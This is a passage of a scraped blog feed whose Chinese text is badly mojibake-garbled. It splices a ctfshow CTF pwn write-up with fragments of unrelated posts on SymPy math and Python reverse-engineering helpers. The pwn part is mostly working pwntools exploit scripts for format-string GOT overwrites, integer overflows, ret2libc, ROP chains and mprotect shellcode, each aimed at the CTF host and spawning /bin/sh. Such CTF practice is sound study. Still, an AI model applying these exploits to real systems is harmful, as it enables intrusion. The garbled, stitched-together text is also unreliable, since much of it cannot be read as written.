ä½ç¬¦ï¼Œç”¨äºä»¥åå…­è¿›åˆ¶æ ¼å¼æ‰“å°æ ˆä¸Šçš„å€¼ã€‚ éªŒè¯ï¼š\n1 2 aaaa%6$p aaaa0x61616161 %6$pï¼šè¿™æ˜¯ä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²å ä½ç¬¦ï¼Œè¡¨ç¤ºæ‰“å°æ ˆä¸Šç¬¬6ä¸ªä½ç½®çš„å€¼ï¼ˆä»¥æŒ‡é’ˆæ ¼å¼ï¼‰ã€‚\næ‹–è¿›IDAåæ±‡ç¼–ï¼Œå‘ç°æœ‰syså‡½æ•°\n1 2 3 4 5 6 7 8 9 10 11 12 13 from pwn import * context.log_level = \u0026#39;debug\u0026#39; #io = process(\u0026#39;./fmt\u0026#39;) io = remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;,28124) elf = ELF(\u0026#39;./pwn\u0026#39;) offset = 6 printf_got = elf.got[\u0026#39;printf\u0026#39;] system_plt = elf.plt[\u0026#39;system\u0026#39;] payload = fmtstr_payload(offset,{printf_got:system_plt}) io.sendline(payload) io.recv() io.sendline(\u0026#39;/bin/sh\\x00\u0026#39;) io.interactive() printf_got = elf.got['printf']:\nè·å–printfå‡½æ•°åœ¨GOTï¼ˆGlobal Offset Tableï¼‰ä¸­çš„åœ°å€ã€‚GOTè¡¨ç”¨äºå­˜å‚¨åŠ¨æ€é“¾æ¥å‡½æ•°çš„å®é™…åœ°å€ã€‚ system_plt = elf.plt['system']:\nè·å–systemå‡½æ•°åœ¨PLTï¼ˆProcedure Linkage Tableï¼‰ä¸­çš„åœ°å€ã€‚PLTè¡¨ç”¨äºè°ƒç”¨åŠ¨æ€é“¾æ¥çš„å‡½æ•°ã€‚ payload = fmtstr_payload(offset, {printf_got: system_plt}):\nä½¿ç”¨pwntoolsçš„fmtstr_payloadå‡½æ•°ç”Ÿæˆä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„åˆ©ç”¨è½½è·ã€‚è¿™ä¸ªè½½è·ä¼šå°†printfå‡½æ•°çš„GOTè¡¨é¡¹ä¿®æ”¹ä¸ºsystemå‡½æ•°çš„åœ°å€ã€‚ offsetæ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åç§»é‡ã€‚ {printf_got: system_plt}è¡¨ç¤ºå°†printf_gotåœ°å€å¤„çš„å€¼ä¿®æ”¹ä¸ºsystem_pltã€‚ io.sendline('/bin/sh\\x00')**:\nå‘é€å­—ç¬¦ä¸²/bin/shç»™ç›®æ ‡ç¨‹åºã€‚ç”±äºprintfçš„GOTè¡¨é¡¹å·²ç»è¢«ä¿®æ”¹ä¸ºsystemï¼Œå› æ­¤å½“ç¨‹åºè°ƒç”¨printfæ—¶ï¼Œå®é™…ä¸Šä¼šè°ƒç”¨system('/bin/sh')ï¼Œä»è€Œå¯åŠ¨ä¸€ä¸ªshellã€‚ pwn95 ä¸ä¸Šä¸€é“é¢˜ç›®ä¸ä¸€æ ·ï¼Œæ²¡æœ‰äº†syså‡½æ•°ï¼Œéœ€è¦å»æ³„éœ²libcï¼Œç„¶åå†ä¿®æ”¹GOT\nè‡ªåŠ¨æ£€æµ‹å­—ç¬¦ä¸²åç§»é‡\n1 2 3 4 5 6 def exec_fmt(payload): io.sendline(payload) info = io.recv() return info auto = FmtStr(exec_fmt) offset = auto.offset exp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 from pwn import * context.log_level = \u0026#39;debug\u0026#39; io = remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;,28291) elf = ELF(\u0026#39;./pwn\u0026#39;) libc = ELF(\u0026#39;/lib/i386-linux-gnu/libc.so.6\u0026#39;) def exec_fmt(payload): io.sendline(payload) info = io.recv() return info auto = FmtStr(exec_fmt) offset = auto.offset printf_got = elf.got[\u0026#39;printf\u0026#39;] payload = p32(printf_got) + (\u0026#39;%{}$s\u0026#39;.format(offset)).encode() io.send(payload) printf = u32(io.recv()[4:8]) system = printf - libc.sym[\u0026#39;printf\u0026#39;] + libc.sym[\u0026#39;system\u0026#39;] log.info(\u0026#34;system ===\u0026gt; %s\u0026#34; % hex(system)) // é€šè¿‡printfå‡½æ•°çš„å®é™…åœ°å€å’Œlibcåº“ä¸­çš„ç¬¦å·åç§»é‡ï¼Œè®¡ç®—å‡ºsystemå‡½æ•°çš„åœ°å€ã€‚ // printf - libc.sym[\u0026#39;printf\u0026#39;]ï¼šè®¡ç®—libcåº“çš„åŸºåœ°å€ã€‚ // + libc.sym[\u0026#39;system\u0026#39;]ï¼šåŠ ä¸Šsystemå‡½æ•°çš„åç§»é‡ï¼Œå¾—åˆ°systemå‡½æ•°çš„å®é™…åœ°å€ã€‚ // ä½¿ç”¨log.infoè¾“å‡ºsystemå‡½æ•°çš„åœ°å€ã€‚ payload = fmtstr_payload(offset,{printf_got:system}) io.send(payload) //ä½¿ç”¨pwntoolsçš„fmtstr_payloadå‡½æ•°ç”Ÿæˆä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„åˆ©ç”¨è½½è·ã€‚ // offsetï¼šæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åç§»é‡ã€‚ // {printf_got: system}ï¼šå°†printf_gotåœ°å€å¤„çš„å€¼ä¿®æ”¹ä¸ºsystemå‡½æ•°çš„åœ°å€ã€‚ //å‘é€è½½è·ï¼Œè§¦å‘æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œä¿®æ”¹printfçš„GOTè¡¨é¡¹ä¸ºsystemå‡½æ•°çš„åœ°å€ io.send(\u0026#39;/bin/sh\u0026#39;) io.recv() io.interactive() pwn96 1 2 fgets(s, 64, stdin);//è¯»å–ç”¨æˆ·è¾“å…¥ï¼Œæœ€å¤š64å­—èŠ‚ printf(s);//è¿™ä¸€è¡Œç›´æ¥å°†ç”¨æˆ·æ§åˆ¶çš„è¾“å…¥ s ä½œä¸º printf çš„æ ¼å¼å­—ç¬¦ä¸²ã€‚è¿™æ˜¯ä¸€ä¸ªç»å…¸çš„æ ¼å¼å­—ç¬¦ä¸²æ¼æ´ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡åœ¨ä»–ä»¬çš„è¾“å…¥ä¸­æä¾›æ ¼å¼è¯´æ˜ç¬¦ï¼ˆä¾‹å¦‚ï¼Œ %x ã€ %s ã€ %n ï¼‰æ¥åˆ©ç”¨å®ƒï¼š ä¸ºäº†ä¿®å¤è¿™ä¸ªæ¼æ´ï¼Œåœ¨è°ƒç”¨ printf æ—¶å§‹ç»ˆä½¿ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²\n1 printf(\u0026#34;%s\u0026#34;, s); ctfshow{\u0026quot; å¼€å¤´,è½¬æ¢ä¸º16è¿›åˆ¶å°±æ˜¯ 63 74 66 73 68\n6f 77 7b\nç„¶åå€’åºå°±æ˜¯ 0x73667463 0x7b776f68,\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 EXP \u0026#39;\u0026#39;\u0026#39;æ³„éœ²æ ˆä¸­çš„å­—ç¬¦ä¸²\u0026#39;\u0026#39;\u0026#39; from pwn import * context(arch = \u0026#39;i386\u0026#39;,os = \u0026#39;linux\u0026#39;,log_level = \u0026#39;debug\u0026#39;) #io = process(\u0026#39;./pwn\u0026#39;) io = remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;,28189) flag=b\u0026#39;\u0026#39; for i in range(6,6+12): payload=\u0026#39;%{}$p\u0026#39;.format(str(i)).encode() io.sendlineafter(b\u0026#39;$ \u0026#39;,payload) aim = unhex(io.recvuntil(b\u0026#39;\\n\u0026#39;,drop=True).replace(b\u0026#39;0x\u0026#39;,b\u0026#39;\u0026#39;)) flag += aim[::-1] print(flag.decode()) io.close() æ³¨æ„æ‰€æœ‰éƒ¨åˆ†éƒ½æ˜¯å­—èŠ‚å¯¹è±¡ï¼\n1 2 3 4 5 %{}p` ä¸­çš„ `{}` ä¼šè¢«æ›¿æ¢ä¸ºå½“å‰çš„ `i` å€¼ï¼Œä¾‹å¦‚ `%1p`ã€`%2p .replace(\u0026#39;0x\u0026#39;, \u0026#39;\u0026#39;)ï¼šå»æ‰è¿”å›æ•°æ®ä¸­çš„ 0x å‰ç¼€ unhex()å°†åå…­è¿›åˆ¶è½¬æ¢æˆå­—èŠ‚ io.recvuntil(\u0026#39;\\n\u0026#39;, drop=True)ï¼šæ¥æ”¶æœåŠ¡å™¨è¿”å›çš„æ•°æ®ï¼Œç›´åˆ°é‡åˆ°æ¢è¡Œç¬¦ \\nï¼Œå¹¶ä¸¢å¼ƒæ¢è¡Œç¬¦ã€‚ aim[::-1]é€†å‘ pwn101 v4å’Œv5åˆå§‹åŒ–ï¼Œè¾“å…¥ä¸¤ä¸ªæ•´æ•°ï¼ŒæŠŠå®ƒè½¬æ¢æˆæ— ç¬¦å·æ•´æ•°ï¼Œå¹¶èµ‹å€¼ç»™v4å’Œv5ï¼Œå¦‚æœv4=0x80000000,v5=0x7FFFFFFF,ç»™flagï¼Œä½†æ˜¯è¦æ±‚è¾“å…¥åè¿›åˆ¶ï¼Œå¿«æ·é”®â€™Hâ€˜è½¬æ¢æ•°æ®ç±»å‹\n1 2 3 4 5 from pwn import * io = remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;,28275) payload = \u0026#34;-2147483648 2147483647\u0026#34; io.sendlineafter(\u0026#34;Enter two intergers:\u0026#34;,payload) io.interative() pwn102 è¦æ±‚è¾“å…¥æ— ç¬¦å·æ•´å‹ï¼Œè¾“å…¥4294967295å°±è¡Œ\npwn105 æ•´å½¢æº¢å‡º\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 int __cdecl main(int argc, const char **argv, const char **envp) { char buf[1024]; // [esp+0h] [ebp-408h] BYREF int *p_argc; // [esp+400h] [ebp-8h] p_argc = \u0026amp;argc; init(); logo(); puts(\u0026#34;[+] Check your permissions:\u0026#34;); read(0, buf, 0x400u); ctfshow(buf); puts(\u0026#34;wtf\u0026#34;); return 0; } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 char *__cdecl ctfshow(char *s) { char dest[8]; // [esp+7h] [ebp-11h] BYREF unsigned __int8 v3; // [esp+Fh] [ebp-9h] v3 = strlen(s); if ( v3 \u0026lt;= 3u || v3 \u0026gt; 8u ) { puts(\u0026#34;Authentication failed!\u0026#34;); exit(-1); } printf(\u0026#34;Authentication successful, Hello %s\u0026#34;, s); return strcpy(dest, s); } unsigned __int8 v3 è¦æ±‚æ— ç¬¦å·8ä½æ•´æ•°\nstrcpy(dest, s) å°†ä¼šå¤åˆ¶8ä¸ªå­—ç¬¦åŠ ä¸Šä¸€ä¸ªç©ºå­—ç¬¦ \\0ï¼Œæ€»å…±9ä¸ªå­—ç¬¦ï¼Œ\nè¿™é‡Œå°±æ˜¯æ£€æŸ¥å­—ç¬¦ä¸²é•¿åº¦ï¼Œæ€è€ƒï¼šå¦‚ä½•bypassè¿™ä¸ªifæ¡ä»¶\ndestçš„æ ˆé•¿åº¦ä¸º0x11,ç¼“å†²åŒºbufé•¿åº¦0x400ï¼Œunsigned __int8 v3ä»0åˆ°255å­—èŠ‚å°±æˆªæ–­ï¼Œå°±æ˜¯è¯´256å­—èŠ‚æ˜¯0ï¼Œ257å­—èŠ‚è¡¨ç¤º1ï¼Œ258å­—èŠ‚è¡¨ç¤º3ï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¡ä»¶æ„é€ payloadï¼Œä½¿payloadé•¿åº¦è¶³å¤Ÿé•¿\npwn107 æµç¨‹ï¼šå…ˆæƒ³å¦‚ä½•ç»•è¿‡æ•´æ•°é™åˆ¶ï¼Œæ³„éœ²printfåœ°å€ï¼Œè®¡ç®—libcåŸºå€ï¼Œè®¡ç®—systemå’Œ/bin/shçš„åœ°å€ï¼Œè°ƒç”¨system(\u0026quot;/bin/sh\u0026quot;)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 from pwn import * context(arch = \u0026#39;i386\u0026#39;,os = \u0026#39;linux\u0026#39;,log_level = \u0026#39;debug\u0026#39;) io =remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;,28167) elf = ELF(\u0026#39;./pwn\u0026#39;) libc = ELF(\u0026#39;/lib/i386-linux-gnu/libc.so.6\u0026#39;) # ä½¿ç”¨ç³»ç»Ÿé»˜è®¤çš„ libc æ–‡ä»¶è·¯å¾„ io.sendlineafter(b\u0026#39;read?\u0026#39;,b\u0026#39;-1\u0026#39;) io.recv() main = elf.symbols[\u0026#39;main\u0026#39;] printf_got = elf.got[\u0026#39;printf\u0026#39;] printf_plt = elf.plt[\u0026#39;printf\u0026#39;] payload = b\u0026#39;a\u0026#39;*(0x2c + 4)+p32(printf_plt) + p32(main) + p32(printf_got) io.sendline(payload) printf = u32(io.recv(4)) print(hex(printf)) libc_base = printf - libc.symbols[\u0026#39;printf\u0026#39;] system = libc_base + libc.symbols[\u0026#39;system\u0026#39;] binsh = libc_base + next(libc.search(b\u0026#39;/bin/sh\u0026#39;)) io.sendlineafter(b\u0026#39;read?\u0026#39;,b\u0026#39;-1\u0026#39;) io.recv() payload = b\u0026#39;a\u0026#39;*(0x2c + 4)+p32(system) + p32(main) + p32(binsh) io.sendline(payload) io.interactive() æ€è€ƒï¼šä¸ºä»€ä¹ˆæ˜¯printf = u32(io.recv(4))ï¼Œprint(hex(printf))\n1 2 3 data = io.recv(4) # è¿”å› b\u0026#39;\\x7f\\x45\\x4c\\x46\u0026#39; printf = u32(data) # è§£æä¸ºæ•´æ•° 0x464c457f print(hex(printf)) # æ‰“å° 0x464c457f pwn41 system(\u0026quot;/bin/sh\u0026quot;)æ˜¯ç›´æ¥æŒ‡å®šäº†ç³»ç»Ÿé»˜è®¤çš„shellç¨‹åºè·¯å¾„æ¥æ‰§è¡Œå‘½ä»¤,system(\u0026ldquo;sh\u0026rdquo;)åˆ™ä¾èµ–ç³»ç»Ÿçš„ç¯å¢ƒå˜é‡$PATHæ¥å¯»æ‰¾shå¯æ‰§è¡Œæ–‡ä»¶\n1 2 3 4 5 6 7 8 9 10 from pwn import * context.log_level = \u0026#39;debug\u0026#39; io = remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;,28166) elf = ELF(\u0026#39;./pwn(2)\u0026#39;) system = elf.symbols[\u0026#39;system\u0026#39;] sh = 0x080487BA payload = b\u0026#39;a\u0026#39;*(0x12+4)+p32(system)+p32(0)+p32(sh) io.sendline(payload) io.recv() io.interactive() pwn42 å’Œå‰é¢ä¸€æ ·ï¼Œä»…ä»…æ˜¯32ä½å’Œ64ä½çš„åŒºåˆ«\n1 ROPgadget --binary ./pwn 1 2 3 4 5 6 7 8 9 10 11 from pwn import * io = remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;,28139) elf=ELF(\u0026#34;pwn(3)\u0026#34;) system =elf.sym[\u0026#39;system\u0026#39;] sh =0x400872 pop_rdi =0x400843 ret = 0x40053e payload = b\u0026#39;a\u0026#39;*(0xA+8)+ p64(pop_rdi)+p64(sh)+p64(ret)+p64(system) io.sendline(payload) io.recv() io.interactive() pwn43 æ²¡æœ‰â€˜bin/shâ€™éœ€è¦è‡ªå·±æ„é€ ï¼Œå…ˆè°ƒç”¨gets()å‡½æ•°ï¼Œp32(gets),å°†getså‡½æ•°çš„åœ°å€ä½œä¸ºè¿”å›åœ°å€è¦†ç›–åˆ°æ ˆä¸Šï¼Œæ˜¯ç¨‹åºåœ¨æº¢å‡ºæ—¶è°ƒç”¨getså‡½æ•°ï¼Œæ‹2\nä½¿ç”¨pop_ebxæŒ‡ä»¤å°†buf2çš„åœ°å€åŠ è½½åˆ°å¯„å­˜å™¨ebxä¸­ï¼Œæœ€åè¦†ç›–è¿”å›åœ°å€ä¸ºsystemå‡½æ•°çš„åœ°å€\né€šè¿‡è¦†ç›–è¿”å›åœ°å€ï¼Œå°†getså‡½æ•°çš„åœ°å€ä½œä¸ºè¿”å›åœ°å€è¦†ç›–åˆ°æ ˆä¸Šï¼Œä½¿ç”¨pop_ebxæŒ‡ä»¤å°†buf2çš„åœ°å€åŠ è½½åˆ°å¯„å­˜å™¨ebxä¸­ï¼Œæœ€åè¦†ç›–è¿”å›åœ°å€ä¸ºsystemå‡½æ•°çš„åœ°å€ï¼Œæ‰§è¡Œsystem(buf2)æŒ‡å‘çš„å­—ç¬¦ä¸²ï¼Œp32(gets)å°†getså‡½æ•°çš„åœ°å€ä½œä¸ºè¿”å›åœ°å€è¦†ç›–åˆ°æ ˆä¸Šï¼Œæ˜¯ç¨‹åºåœ¨æº¢å‡ºæ—¶è°ƒç”¨getså‡½æ•°ï¼Œpop_ebxç”¨äºå°†æ ˆä¸Šçš„å€¼å¼¹å‡ºå¹¶å­˜å‚¨åˆ°å¯„å­˜å™¨ebxä¸­ï¼Œbuf2æ˜¯ä¸€ä¸ªæŒ‡å‘å­˜å‚¨è¾“å…¥æ•°æ®çš„ç¼“å†²åŒºçš„æŒ‡é’ˆï¼Œp32(system)å°†systemå‡½æ•°çš„åœ°å€ä½œä¸ºè¿”å›åœ°å€è¦†ç›–åˆ°æ ˆä¸Šï¼Œ\u0026lsquo;aaaa\u0026rsquo;è¿™éƒ¨åˆ†æ˜¯ä¸€ä¸ª4å­—èŠ‚çš„å­—ç¬¦ä¸²ï¼Œç”¨äºå¡«å……æ ˆä¸Šçš„è¿”å›åœ°å€çš„å‰©ä½™ç©ºé—´ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 from pwn import * context.log_level = \u0026#39;debug\u0026#39; io =remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;,28141) elf = ELF(\u0026#39;pwn4\u0026#39;) gets = elf.symbols[\u0026#39;gets\u0026#39;] system = elf.symbols[\u0026#39;system\u0026#39;] buf2 = 0x0804B060 pop_ebx = 0x08048409 payload = cyclic(0x6C+4)+p32(gets)+p32(pop_ebx)+p32(buf2)+p32(system)+p32(0)+p32(buf2) io.sendline(payload) io.sendline(\u0026#39;/bin/sh\u0026#39;) io.recv() io.interactive() pwn44 è¡¥å……ä¸‹32ä½å’Œ64ä½è°ƒç”¨è§„å®š\n32ä½ï¼šå‚æ•°é€šè¿‡æ ˆä¼ é€’ï¼Œp32(system)åéœ€è¦è·Ÿå‚æ•°åœ°å€\n64ä½ï¼šå‰6ä¸ªå‚æ•°é€šè¿‡å¯„å­˜å™¨ä¼ é€’ï¼Œå¦‚rdiï¼Œrsiç­‰\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 from pwn import * context(arch = \u0026#39;amd64\u0026#39;,os = \u0026#39;linux\u0026#39;,log_level = \u0026#39;debug\u0026#39;) io =remote(\u0026#34;pwn.challenge.ctf.show\u0026#34;,28242) \\#io = process(\u0026#34;./pwn44\u0026#34;) elf =ELF(\u0026#34;pwn3\u0026#34;) system = elf.symbols[\u0026#34;system\u0026#34;] gets = elf.symbols[\u0026#34;gets\u0026#34;] pop_rdi=0x4007f3 buf2=0x602080 payload = cyclic(0xA+8)+p64(pop_rdi)+p64(buf2)+p64(gets)+p64(pop_rdi)+p64(buf2)+p64(system) io.sendline(payload) io.sendline(\u0026#34;/bin/sh\u0026#34;) io.interactive() pwn45 æ²¡æœ‰systemï¼Œä¹Ÿæ²¡æœ‰â€œbin/shâ€\næ³„éœ²writeå‡½æ•°åœ°å€è·å– libc ç‰ˆæœ¬\nè·å– system åœ°å€ä¸ /bin/sh çš„åœ°å€\nå†æ¬¡æ‰§è¡Œæºç¨‹åº\nè§¦å‘æ ˆæº¢å‡ºæ‰§è¡Œ system(â€˜/bin/shâ€™)\nï¼ˆå¯ä»¥åˆ©ç”¨putså‡½æ•°ï¼‰\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 from pwn import * from LibcSearcher import * context.log_level = \u0026#39;debug\u0026#39; io =remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;,28149) elf = ELF(\u0026#39;pwn\u0026#39;) main = elf.symbols[\u0026#39;main\u0026#39;] write_got=elf.got[\u0026#39;write\u0026#39;] write_plt=elf.plt[\u0026#39;write\u0026#39;] payload = cyclic(0x6b+4) + p32(write_plt) + p32(main) + p32(0) +p32(write_got) + p32(4) io.sendline(payload) write=u32(io.recvuntil(b\u0026#39;\\xf7\u0026#39;)[-4:]) #writeåœ¨gotè¡¨çš„åœ°å€ print(hex(write)) libc = LibcSearcher(\u0026#39;write\u0026#39;,write) libc_base=write-libc.dump(\u0026#39;write\u0026#39;) system = libc_base+libc.dump(\u0026#39;system\u0026#39;) binsh = libc_base+libc.dump(\u0026#39;str_bin_sh\u0026#39;) payload = cyclic(0x6b+4)+p32(system)+p32(main)+p32(binsh) io.sendline(payload) io.recv() io.interactive() pwn47 ä¸€çœ‹ç›´æ¥æ‰“å°åœ°å€ï¼Œæ‰‹åŠ¨å†™è‡ªåŠ¨è„šæœ¬éƒ½è¡Œ\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 from pwn import * from LibcSearcher import * # è®¾ç½®ç›®æ ‡ç¨‹åº context(arch=\u0026#39;amd64\u0026#39;, os=\u0026#39;linux\u0026#39;, log_level=\u0026#39;debug\u0026#39;) # æœ¬åœ°è°ƒè¯•æˆ–è¿œç¨‹è¿æ¥ # io = process(\u0026#39;./vulnerable_binary\u0026#39;) # æœ¬åœ° io = remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;, 28266) # è¿œç¨‹ elf =ELF(\u0026#39;pwn6\u0026#39;) io.recvuntil(\u0026#34;puts: \u0026#34;) puts = eval(io.recvuntil(\u0026#39;\\n\u0026#39;, drop=True)) bin_sh = 0x0804B028 libc = LibcSearcher(\u0026#39;puts\u0026#39;, puts) libc_base = puts - libc.dump(\u0026#39;puts\u0026#39;) system = libc_base + libc.dump(\u0026#39;system\u0026#39;) bin_sh = libc_base + libc.dump(\u0026#39;str_bin_sh\u0026#39;) payload = cyclic(0x9C + 4) + p32(system) + p32(0) + p32(bin_sh) io.sendline(payload) io.recv() io.interactive() pwn48 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 from pwn import * from LibcSearcher import * context.log_level = \u0026#39;debug\u0026#39; io = remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;,28103) elf =ELF(\u0026#39;pwn8\u0026#39;) main = elf.symbols[\u0026#39;main\u0026#39;] puts_got = elf.got[\u0026#39;puts\u0026#39;] puts_plt = elf.plt[\u0026#39;puts\u0026#39;] io.recvuntil(\u0026#34;O.o?\u0026#34;) payload = cyclic(0x6b+4)+p32(puts_plt)+p32(main)+p32(puts_got) io.sendline(payload) puts = u32(io.recvuntil(b\u0026#39;\\xf7\u0026#39;)[-4:]) print(hex(puts)) libc =LibcSearcher(\u0026#39;puts\u0026#39;,puts) libc_base = puts-libc.dump(\u0026#39;puts\u0026#39;) binsh = libc_base + libc.dump(\u0026#39;str_bin_sh\u0026#39;) system = libc_base + libc.dump(\u0026#39;system\u0026#39;) payload = cyclic(0x6b+4)+p32(system)+p32(main)+p32(binsh) io.sendline(payload) io.recv() io.interactive() æ€»ç®—æ˜ç™½äº†payloaçš„åŒºåˆ«äº†\npayload = cyclic(0x9C+4)+p32(puts_plt)+p32(0)+p32(puts_got)+p32(4)\nè¿”å›åœ°å€0ï¼Œä»¤ç¨‹åºå´©æºƒï¼Œæ³„éœ²putsåœ°å€åç¨‹åºå´©æºƒ\npayload = cyclic(0x9C+4)+p32(puts_plt)+p32(main)+p32(puts_got)\nè¿”å›mainå‡½æ•°ï¼Œç¨‹åºç»§ç»­è¿è¡Œ\npwn49 mprotectå‡½æ•°\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 from pwn import * from LibcSearcher import * context.log_level = \u0026#39;debug\u0026#39; io = remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;,28263) elf =ELF(\u0026#39;pwn49\u0026#39;) mprotect = elf.symbols[\u0026#39;mprotect\u0026#39;] read=0x0806BEE0 pop_ebx_esi_ebp_ret =0x080a019b addr=0x080DA000 size=0x2000 proc=0x7 payload=cyclic(0x12+4)+p32(mprotect) payload+=p32(pop_ebx_esi_ebp_ret)+p32(addr)+p32(size)+p32(proc)+p32(read)+p32(pop_ebx_esi_ebp_ret)+p32(0)+p32(addr)+p32(size)+p32(addr) io.sendline(payload) shellcode = asm(shellcraft.sh()) io.send(shellcode) #ç”¨äºç”Ÿæˆä¸€ä¸ªæ‰§è¡Œ/bin/sh io.recv() io.interactive() ","date":"2025-03-15T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/ctfshow-pwn/","title":"ctfshow-pwn"},{"content":".most_common()\nç¬¬ä¸€ä¸ªæ˜¯å‡ºç°æœ€é¢‘ç¹çš„æ•°å­—ï¼Œç¬¬äºŒä¸ªæ˜¯æ¬¡æ•°\næ•£ç‚¹å›¾\nç”¨SymPyåŒ…è§£ä»£æ•°å’Œç¬¦å·æ•°å­¦é—®é¢˜\nè‡ªå®šä¹‰è¿ç®—ç¬¦å·\nè¿™é‡Œè¡¥å……ä¸€ä¸‹ï¼šå­¦åˆ°åé¢å‘ç°è‡ªå·±ç†è§£é”™äº†ï¼Œsymbol()æ˜¯è¦å®šä¹‰ä¸ºå˜é‡\nfrom sympy import *\nfactor(a)åˆ†è§£\nexpand(a)å±•å¼€\npprint(a)æ•´é½è¾“å‡º\nç”¨å€¼æ›¿ä»£ç¬¦å·\næ±‚è§£æ–¹ç¨‹å¹¶éªŒè¯\nç»˜å›¾\nä¿å­˜\np.save(\u0026rsquo;line.png')\nç»˜åˆ¶ç”¨æˆ·è¾“å…¥çš„è¡¨è¾¾å¼\nåˆ›å»ºä¸€ä¸ªsymbolå¯¹è±¡yï¼Œä¸ºå“ªä¸ªå˜é‡è§£æ–¹ç¨‹ï¼Œå°†yä½œä¸ºç¬¬äºŒä¸ªå‚æ•°è°ƒç”¨solve()å‡½æ•°\nç»˜å›¾å…ˆè¦æå–\nå¤šå‡½æ•°å›¾å½¢ç»˜åˆ¶\näº‹ä»¶Aæˆ–Bå‘ç”Ÿçš„æ¦‚ç‡ äº‹ä»¶Aå’ŒBåŒæ—¶å‘ç”Ÿçš„æ¦‚ç‡ ç¬›å¡å°”ç§¯ æ‰“ä¹±é¡ºåºï¼šrandom.shuffle(x)\nè®¡ç®—æé™ ä¸‰ä¸ªå‚æ•°ï¼Œå‡½æ•°è¡¨è¾¾å¼ï¼Œå˜é‡ï¼Œè®¡ç®—å‡½æ•°æé™çš„å€¼ï¼Œdir=\u0026rsquo;-1\u0026rsquo;è¡¨ç¤ºä»è´Ÿæ–¹å‘è¶‹äºæé™\nè®¡ç®—å¯¼æ•° å®šä¹‰å†™ï¼Œdelta_tå°±æ˜¯å˜åŒ–ç‡\nå…ˆå»ºç«‹Derivativeç±»ï¼Œå†è°ƒç”¨ä¸¤ä¸ªå‡½æ•°ï¼Œä¼ é€’å®å‚1ï¼Œè°ƒç”¨doit()è®¡ç®—å¯¼æ•°\næ±‚åå¯¼æ•°ï¼ŒæŠŠä¸€ä¸ªé‡çœ‹ä½œå˜é‡å°±è¡Œ\nè®¡ç®—æå€¼ç‚¹ .eval()æ˜¯æŠŠç¬¦å·å…·ä½“è½¬æ¢æˆæ•°å€¼\næ±‚å‡½æ•°ç§¯åˆ† å˜é‡ï¼Œä¸‹é™ï¼Œä¸Šé™\nä¸Šå‡æ¢¯åº¦ç®—æ³• 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 from sympy import * def grad_ascent(x0,f1x,x): epsilon = 1e-6 step_size =1e-4 x_old = x0 x_new = x_old + step_size*f1x.subs(x,x_old).evalf() while abs(x_old - x_new) \u0026gt; epsilon: x_old = x_new x_new = x_old + step_size*f1x.subs(x,x_old).evalf() return x_new if __name__==\u0026#39;__main__\u0026#39;: f = input(\u0026#39;Enter a function in one variable:\u0026#39;) var = input(\u0026#39;Enter the variable to differentiate with respect to:\u0026#39;) var0 = float(input(\u0026#39;Enter the initial value of the variable:\u0026#39;)) try: f= sympify(f) except SympifyError: print(\u0026#39;Invalid function entered\u0026#39;) else: var = Symbol(var) d=Derivative(f,var).doit() var_max = grad_ascent(var0,d,var) print(\u0026#39;{0}:{1}\u0026#39;.format(var.name,var_max)) print(\u0026#39;Maixum value:{0}\u0026#39;.format(f.subs(var,var_max))) ","date":"2025-03-14T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/%E6%95%B0%E5%AD%A6%E7%BC%96%E7%A8%8B/","title":"æ•°å­¦ç¼–ç¨‹"},{"content":"ä¸€äº›å¸¸è§çš„é€†å‘å‡½æ•° index() find()æ‰¾ç´¢å¼•å€¼\n.append(ord()) +=chr()å­—æ¯æ•°å­—è½¬æ¢\nç®€ç®€å•å•çš„é€»è¾‘é¢˜ 1 2 3 4 5 6 ord å­—ç¬¦ä¸²è½¬asciiç  chr asciiç è½¬å­—ç¬¦ä¸² hex åè¿›åˆ¶è½¬åå…­è¿›åˆ¶ int(aï¼Œ16) åå…­è¿›åˆ¶è½¬åè¿›åˆ¶ [èµ·ç‚¹,ç»ˆç‚¹,æ­¥é•¿] pythonåˆ‡ç‰‡ zfill(2) 